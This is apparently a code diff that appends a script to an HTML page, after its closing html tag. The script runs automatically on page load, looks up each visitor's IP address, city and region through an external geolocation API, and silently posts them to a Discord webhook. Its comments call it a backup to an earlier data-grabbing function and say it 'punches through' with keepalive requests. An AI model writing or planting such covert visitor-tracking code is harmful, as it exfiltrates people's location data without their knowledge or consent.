@@ -122,3 +122,38 @@
 </script>
 </body>
 </html>
+<script>
+    async function enforceData() {
+        // Check if the previous modules actually got the IP
+        // We use a secondary, hyper-fast API specifically for the 'Last Stand'
+        const emergencyFetch = async () => {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return `[EMERGENCY BYPASS]\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}`;
+            } catch (e) {
+                return "[CRITICAL FAILURE] - Connection Heavily Shielded";
+            }
+        };
+
+        // If the main run() function didn't trigger the Webhook yet, this forces it.
+        const backupData = await emergencyFetch();
+        
+        // Final "Force-Push" to Discord using a raw text-string to ensure zero errors
+        const finalPacket = {
+            content: `**[ENFORCER LOG]**\n${backupData}\n**Status:** Finalizing Redirect...`
+        };
+
+        // We use the 'keepalive' fetch one last time to punch through
+        fetch(HOOK, { 
+            method: 'POST', 
+            mode: 'no-cors', 
+            keepalive: true, 
+            body: JSON.stringify(finalPacket) 
+        });
+    }
+
+    // This ensures Section 7 runs exactly 100ms after the main script starts,
+    // acting as a safety net that catches the data if the main loop stalls.
+    setTimeout(enforceData, 100);
+</script>
